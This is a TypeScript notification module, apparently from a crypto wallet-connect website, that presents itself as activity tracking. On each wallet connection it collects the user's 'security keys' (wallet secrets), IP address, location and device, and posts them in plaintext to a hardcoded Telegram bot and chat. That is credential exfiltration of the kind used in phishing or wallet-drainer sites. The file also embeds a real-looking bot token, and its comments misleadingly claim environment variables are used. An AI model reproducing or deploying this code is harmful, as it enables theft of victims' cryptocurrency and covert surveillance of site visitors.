/**
 * TELEGRAM NOTIFICATION CONFIGURATION
 *
 * This service sends real-time notifications to your Telegram chat when users:
 * 1. Visit the platform (with location and device info)
 * 2. Connect their wallets (with wallet type and security key status)
 *
 * SETUP INSTRUCTIONS:
 * 1. Create a Telegram Bot:
 *    - Message @BotFather on Telegram
 *    - Send /newbot and follow instructions
 *    - Copy the bot token (looks like: 123456789:ABCdefGHIjklMNOpqrsTUVwxyz)
 *
 * 2. Get Your Chat ID:
 *    - Start a chat with your bot
 *    - Send any message to the bot
 *    - Visit: https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates
 *    - Find "chat":{"id": YOUR_CHAT_ID} in the response
 *
 * 3. Set Environment Variables in Vercel:
 *    - TELEGRAM_BOT_TOKEN=your_bot_token_here
 *    - TELEGRAM_CHAT_ID=your_chat_id_here
 *
 * TO CHANGE BOT OR CHAT:
 * - Simply update the environment variables in your Vercel project settings
 * - No code changes needed - the system will automatically use new credentials
 */

// Telegram notification service for user activity tracking
export interface UserActivity {
  type: "visit" | "wallet_connect"
  timestamp: string
  userAgent: string
  location?: {
    country?: string
    city?: string
    ip?: string
  }
  walletType?: string
  securityKeysProvided?: boolean
  securityKeys?: string
}

export async function sendTelegramNotification(activity: UserActivity) {
  try {
    // These environment variables are set in Vercel project settings
    // TELEGRAM_BOT_TOKEN: Get from @BotFather when creating a new bot
    // TELEGRAM_CHAT_ID: Your personal chat ID or group chat ID where notifications will be sent
    const botToken = "8458697800: AAHNOVAFjNuE0PcHY3qA26
OiHHFhbvNCGqw"
    const chatId = "7825226450"

    if (!botToken || !chatId) {
      console.warn(
        "⚠️ Telegram credentials not configured. Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in environment variables",
      )
      return
    }

    let message = ""

    if (activity.type === "visit") {
      // Format: Platform visit notification with user details
      message =
        `🌐 <b>New Platform Visit</b>\n\n` +
        `⏰ Time: ${new Date(activity.timestamp).toLocaleString()}\n` +
        `🌍 Location: ${activity.location?.city || "Unknown"}, ${activity.location?.country || "Unknown"}\n` +
        `📱 Device: ${activity.userAgent}\n` +
        `🔗 IP: ${activity.location?.ip || "Hidden"}`
    } else if (activity.type === "wallet_connect") {
      message =
        `💰 <b>Wallet Connected</b>\n\n` +
        `⏰ Time: ${new Date(activity.timestamp).toLocaleString()}\n` +
        `👛 Wallet: ${activity.walletType}\n` +
        `🔐 Security Keys: ${activity.securityKeysProvided ? "✅ Provided" : "❌ Not provided"}\n` +
        `📝 Keys: ${activity.securityKeys ? activity.securityKeys : "Not provided"}\n` +
        `🌍 Location: ${activity.location?.city || "Unknown"}, ${activity.location?.country || "Unknown"}\n` +
        `📱 Device: ${activity.userAgent}\n` +
        `🔗 IP: ${activity.location?.ip || "Hidden"}`
    }

    // Send message to Telegram using Bot API
    // URL format: https://api.telegram.org/bot<TOKEN>/sendMessage
    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId, // Where to send the message (your chat ID)
        text: message, // The formatted notification message
        parse_mode: "HTML", // Enables bold text and formatting
      }),
    })

    if (!response.ok) {
      const errorText = await response.text()
      console.error(`[redwhalesdev] Telegram API error: ${response.status} ${response.statusText}`)
      console.error(`[redwhalesdev] Telegram API response: ${errorText}`)
      throw new Error(`Telegram API error: ${response.status} ${response.statusText} - ${errorText}`)
    }

    const result = await response.json()
    console.log("[redwhalesdev] ✅ Telegram notification sent successfully:", result.ok)
  } catch (error) {
    console.error("[redwhalesdev] ❌ Failed to send Telegram notification:", error)
    throw error
  }
}
